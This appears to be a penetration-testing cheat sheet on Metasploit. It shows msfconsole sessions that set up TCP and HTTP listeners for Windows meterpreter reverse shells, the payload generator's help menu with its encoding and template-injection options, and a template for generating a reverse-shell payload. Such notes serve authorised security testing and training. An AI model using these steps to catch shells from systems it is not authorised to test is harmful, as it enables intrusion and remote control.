# 01 - Shell Handler

Search Tag(s): #metasploit-framework #command-and-control

## 1.1 - Multi Handler

### 1.1.1 - Setting up a TCP listener

```
$ sudo msfconsole -q

msf > use exploit/multi/handler

msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp

msf exploit(multi/handler) > set lhost 10.0.2.6
lhost => 10.0.2.6
msf exploit(multi/handler) > set lport 4444
lport => 4444
msf exploit(multi/handler) > exploit -j
[*] Exploit running as background job 1.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.0.2.6:4444
```

### 1.1.2 - Setting up a HTTP listener

```
$ sudo msfconsole -q

msf > use exploit/multi/handler

msf exploit(multi/handler) > set payload windows/meterpreter/reverse_http

msf exploit(multi/handler) > set lhost 10.0.2.6
lhost => 10.0.2.6
msf exploit(multi/handler) > set lport 80
lport => 80
msf exploit(multi/handler) > set SessionCommunicationTimeout 0
SessionCommunicationTimeout => 0
msf exploit(multi/handler) > set ExitOnSession false
ExitOnSession => false
msf exploit(multi/handler) > exploit -j
[*] Exploit running as background job 1.
[*] Exploit completed, but no session was created.

[*] Started HTTP reverse handler on 10.0.2.6:80
```

## 1.2 - Payload

### 1.2.1 - Help Menu

```
Payload Commands
================

    Command       Description
    -------       -----------
    check         Check to see if a target is vulnerable
    exploit       Creates a handler with the specified payload
    generate      Generates a payload
    reload        Reload the current module from disk
    to_handler    Creates a handler with the specified payload

msf payload(windows/x64/meterpreter/reverse_tcp) > generate -h
Usage: generate [options]

Generates a payload. Datastore options may be supplied after normal options.

Example: generate -f python LHOST=127.0.0.1

OPTIONS:

    -b   The list of characters to avoid example: '\x00\xff'
    -E   Force encoding
    -e   The encoder to use
    -f   Output format: base32,base64,bash,c,csharp,dw,dword,go,golang,hex,java,js_be,js_le,nim,nimlang,num,perl,pl,powershell,ps1,py,python,raw,rb,ruby,rust,rustlang,sh,vbapplication,vbscript,asp,aspx,aspx-exe,axis2,dll,ducky-script-psh,elf,elf-so,exe,exe-only,exe-service,exe-small,hta-psh,jar,jsp,loop-vbs,macho,msi,msi-nouac,osx-app,psh,psh-cmd,psh-net,psh-reflection,python-reflection,vba,vba-exe,vba-psh,vbs,war
    -h   Show this message
    -i   The number of times to encode the payload
    -k   Preserve the template behavior and inject the payload as a new thread
    -n   Prepend a nopsled of [length] size on to the payload
    -o   The output file name (otherwise stdout)
    -O   Deprecated: alias for the '-o' option
    -p   The platform of the payload
    -P   Total desired payload size, auto-produce appropriate NOP sled length
    -S   The new section name to use when generating (large) Windows binaries
    -v   Verbose output (display stage in addition to stager)
    -x   Specify a custom executable file to use as a template
```

### 1.2.2 - Usage

```
msf > use payload/windows/x64/meterpreter/reverse_tcp

msf payload(windows/x64/meterpreter/reverse_tcp) > options

Module options (payload/windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


View the full module info with the info, or info -d command.

msf payload(windows/x64/meterpreter/reverse_tcp) > set lhost <IP>

msf payload(windows/x64/meterpreter/reverse_tcp) > set lport <PORT>

msf payload(windows/x64/meterpreter/reverse_tcp) > set exitfunc <seh | thread | process | none>

msf payload(windows/x64/meterpreter/reverse_tcp) > generate -p <platform> -f <format> [-o shell.extension]

msf payload(windows/x64/meterpreter/reverse_tcp) > <exploit | to_handler>
```